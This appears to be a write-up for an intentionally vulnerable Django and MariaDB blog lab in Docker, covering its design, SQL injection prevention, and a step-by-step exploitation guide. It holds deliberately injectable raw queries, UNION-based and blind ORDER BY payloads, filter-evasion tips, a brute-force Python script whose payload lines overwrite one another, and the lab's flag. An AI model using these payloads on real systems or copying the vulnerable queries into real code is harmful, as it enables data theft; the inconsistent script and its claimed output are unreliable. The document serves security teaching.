---
title: Vulnerable Blog Website - Docker Project
tags:
    - Djnago
    - MariaDB
    - Blog
    - Docker
    - Vulnerable-web-app
---

![](/static/images/1.jpg)

## 1. Introduction

This report presents the development of a **blog web application** implemented using **Django**, **MariaDB**, and deployed within a **Docker** container. The project aims to demonstrate web application development using modern containerized architectures while providing a controlled environment for security testing.

## 2. Project Objectives

The main objectives of this project are:

- To build a functional **blog platform** using **Django**.
- To set up a **database-driven web application** with **MariaDB**.
- To containerize the application using **Docker** for ease of deployment and scalability.

## 3. System Architecture

The system follows a **three-tier architecture**:

1. **Frontend:** Django templates for rendering HTML pages.
2. **Backend:** Django framework handling requests and processing business logic.
3. **Database Layer:** MariaDB storing user and blog data.

Docker is used to manage the different services in separate containers, ensuring portability and scalability.

## 4. Technologies Used

- **Django** (Web Framework)
- **MariaDB** (Relational Database)
- **Docker** (Containerization)
- **Debian-based system (Python 3.13 image)**

## 5. Implementation Details

### 5.1 Database Design

The database consists of the following tables:

- **accounts_user:** Stores user credentials and profile information.
- **accounts_post:** Stores blog posts with titles, content, timestamps, and authors.
- **accounts_comment:** Stores user comments on blog posts.

### 5.2 Backend Functionality

- **User Authentication:** Login, registration, and password .
- **CRUD Operations:** Users can create, read, update, and delete blog her posts.
- **Comment System:** Registered users can leave comments on posts.

### 5.3 Dockerization

The project is containerized with the following services:

- **Django Application** (`python:3.13` image)
- **MariaDB Database**

### 5.4 Deployment

#### Prerequisites

Ensure **Docker** and **Docker Compose** are installed.
#### Steps to Run the Project

1. Clone the repository:
    
    ```sh
    git clone https://github.com/Mgh-Zakariae/Vulnerable_web_app.git
	cd Vulnerable_web_app
    ```
    
2. Build and run the Docker containers:
    
    ```sh
    docker-compose up --build -d
    ```
    
3. Access the web application at:
    
    ```
    http://localhost:8000
    ```
    

## 6. SQL Injection Vulnerabilities and Prevention

### 6.1 SQL Injection in the Project

This project contains two types of **SQL Injection (SQLi) vulnerabilities**:

1. **Normal SQL Injection:** A vulnerability in user input fields where unescaped SQL queries allow unauthorized data access.
2. **Blind SQL Injection (ORDER BY Exploit):** Exploiting ORDER BY clauses to extract database information indirectly.

Example of a vulnerable SQL query:

```
query = f"SELECT title, content, category FROM accounts_post WHERE id = '{id}'"
conn.execute(query)
```

If a attacker enters ` ' UNION SELECT database() -- -`, the query returns database name.

```
query = f"SELECT * FROM accounts_post WHERE author_id = '{id_user}' ORDER BY {sort_by} DESC"
con.execute(query)
```

### 6.2 Preventing SQL Injection

To prevent SQL Injection, the following best practices should be applied:

- **Use Parameterized Queries:**
    
    ```
    cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
    ```
    
- **Utilize Django ORM:** Instead of raw SQL queries, Django’s ORM handles user input safely:
    
    ```
    User.objects.filter(username=user_input)
    ```
    
- **Input Validation & Sanitization:** Ensure input fields accept only expected formats.
- **Use Web Application Firewalls (WAF):** Detect and block SQLi attempts.
- **Limit Database Privileges:** Restrict database permissions to minimize damage from potential attacks.

## 7. **Exploitation Guide:** 

⚠️ This project is for educational and research purposes only. Do not deploy or test on unauthorized systems.

### 7.1 Classic SQL Injection

1. **Identify the Vulnerability**:
    - The application has an input field in http://localhost:8000/posts/my_posts/details/?id=18 that is vulnerable to SQL injection.
    - You can test this by entering a single quote (`'`) and observing if the application throws an error or behaves unexpectedly.
    ![](/static/images/2.jpg)

2. **Manual Exploitation**:
    - Instead of using automated tools like `sqlmap`, you can exploit the vulnerability manually.
    - The application is vulnerable to **Union-Based SQL Injection**.

3. **Enumerate the Database**:
    - Use a payload to determine the number of columns. For example:
        - **Using `UNION SELECT`**:
		- inject `NULL` values until the number of columns matches.
		- The query that does not produce an error reveals the number of columns.
```sql
  ' UNION SELECT NULL--
  ' UNION SELECT NULL, NULL--
  ' UNION SELECT NULL, NULL, NULL--
```
- Use a payload to enumerate the database schema. For example:
		`' UNION SELECT NULL,NULL,...,schema_name FROM INFORMATION_SCHEMA.SCHEMATA-- -`
>it only work if you add number of null values that match the number of columns

4. Detect if there is a filter:
	- After doing the previous step, you may notice that everything is not working, because there is a filter. you need to apply one of the filter evasion techniques.
		- you can try URL Encoding,  Hexadecimal Encoding, changing the case of SQL keywords like sEleT , fRoM ....

5. **Find the Flag Table**:
    
    - Once you know the method to bypass filter, the database name, the number of columns, enumerate the tables:
        
        ```
        ' UNION SELECT NULL,NULL,....,table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='database_name' -- -
        ```
        
    - Look for a table named `flag`.
6. **Retrieve the Flag**:
    
    - The `flag` table contains a column named `flag`. Use the following payload to retrieve the flag:
        
        ```
        ' UNION SELECT NULL,NULL,.....,flag FROM flag -- -
        ```
    - The application will return the flag.
	- flag is `MGHFLAG{d1g1t4l_gh0st_Good_Job_7r4ck3r_9071}`

---
### 7.2 Blind SQL Injection

1. **Identify the Vulnerability**:
	- The application has an input field in http://localhost:8000/posts/my_posts?sort=date that is vulnerable to Blind SQL injection.
    - You can test this by entering a` title desc -- -` and observing if the application behaves unexpectedly
    ![](/static/images/3.jpg)

2. Manual Exploitation:
	-  you can use the following query that used with `order by` to found the flag : 
		- `CASE WHEN (select SUBSTRING(flag,0,lengh) from flag) = 'char' THEN title ELSE Date END `
	- if the web site sort the posts with *title* that means the character is correct (it's the first char. from the flag) , 
>			- SUBSTRING(column, start_position, length)
>			- The `SUBSTRING` function extracts a portion of a string
>			- Syntax: `SUBSTRING(string, start_position, length)
>			- Example: `SUBSTRING('hello', 2, 3)` returns `'ell'`.

1. Automation of exploitation:
	-  to exploit this vulnerability by this query , we write a script  to automate the process
	- This script is an **automated Blind SQL Injection exploit** that brute-forces a flag character by character using the `ORDER BY` clause. It works by:
		1. **Generating a character set** (`array`) containing letters, numbers, and special symbols.
		2. **Sending an initial request** to determine the response when ordering by `title`.
		3. **Iterating through possible flag lengths (1 to 40 characters)** and testing each character in `array`.
		4. **Using a conditional SQL query** (`CASE WHEN ... THEN title ELSE category END`) to check if the substring of the flag matches the guessed characters.
		5. **Comparing responses**: If the response matches the original request with `title`, the guessed character is correct, and it is added to the `flag`.
		6. **Printing the extracted flag progressively** until fully retrieved.

```python
import string
import requests
import urllib.parse

array = list(string.ascii_letters + string.digits)
array.extend(list("{}()_-$@!#"))

url = "http://localhost:3000/posts/my_posts?sort="

cookies = {"sessionid": "j8kob0o3a42uoktgmo3rh0vrx1dbvkwx"}

req_with_title = requests.get(url + "title", cookies=cookies).text

flag = ""
print("#### Start Exploit")

for i in range(1, 40):
    for l in array:
        payload = f"CASE WHEN (select BINARY SUBSTRING(flag,1,{i}) from flag) = '{flag+l}' THEN title ELSE category END"
        payload = f"CASE WHEN (select BINARY SUBSTRING(table_name,1,{i}) from information_schema.tables LIMIT 1) = '{flag+l}' THEN title ELSE category END"
        payload = f"CASE WHEN (select BINARY SUBSTRING(database(),1,{i})) = '{flag+l}' THEN title ELSE category END"
        encoded_payload = urllib.parse.quote_plus(payload) 

        req = requests.get(url + encoded_payload, cookies=cookies)
        if req.text == req_with_title:
            flag += l
            print(f"Current flag: {flag}")
            break
    if flag[-1] == "}":
        break
print(f"Final flag: {flag}")
```

- you can modify this script to enumerate more information about database , for example to enumerate name of database you can use this payload : `payload = f"CASE WHEN (select BINARY SUBSTRING(database(),1,{i})) = '{flag+l}' THEN title ELSE category END`

- its output is  : 

```bash
Final --> flag: MGHFLAG{d1g1t4l_gh0st_Good_Job_7r4ck3r_9071}
```



## 8. Conclusion

This project demonstrates the **development and deployment of a web application** using Django, MariaDB, and Docker. It provides a **scalable**, **modular**, and **secure** architecture for further development and improvements.

